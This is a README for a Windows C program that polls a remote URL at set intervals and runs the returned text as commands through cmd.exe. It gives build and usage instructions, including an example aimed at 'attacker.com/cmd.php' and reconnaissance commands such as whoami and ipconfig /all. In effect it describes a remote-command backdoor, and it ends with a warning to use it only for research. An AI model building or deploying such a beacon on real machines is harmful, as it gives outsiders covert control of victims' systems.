# Command Monitor - Windows C Implementation

A Windows C program that periodically polls a remote URL for commands and executes them on the local system.

## Features

- Polls a remote URL at configurable intervals (default: 5 minutes)
- Downloads commands as plain text from the URL
- Executes commands using Windows `cmd.exe`
- Handles HTTP and HTTPS connections
- Includes error handling and timeout protection

## Compilation

### Using MinGW (GCC for Windows)

```bash
gcc -Wall -Wextra -std=c11 -o command_monitor.exe command_monitor.c -lwinhttp
```

Or use the Makefile:
```bash
make -f Makefile.win
```

### Using Microsoft Visual C++

```bash
cl /Fe:command_monitor.exe command_monitor.c winhttp.lib /link /SUBSYSTEM:CONSOLE
```

## Usage

```bash
command_monitor.exe <url> [interval_minutes]
```

### Examples

```bash
# Check every 5 minutes (default)
command_monitor.exe http://example.com/command.txt

# Check every 10 minutes
command_monitor.exe https://192.168.1.100/api/command 10

# Check every 1 minute
command_monitor.exe http://attacker.com/cmd.php 1
```

## URL Response Format

The remote URL should return a plain text command. Examples:

- `dir C:\`
- `whoami`
- `ipconfig /all`
- `powershell -Command "Get-Process"`
- `exit` (stops the monitor)
- `noop` (skips execution)

## Notes

- Commands are executed with a 30-second timeout
- The program runs in an infinite loop until stopped (Ctrl+C) or receives "exit" command
- Supports both HTTP and HTTPS
- Commands are executed via `cmd.exe /c`

## Security Warning

This program executes arbitrary commands from a remote source. Use only in controlled environments for security research and testing purposes.
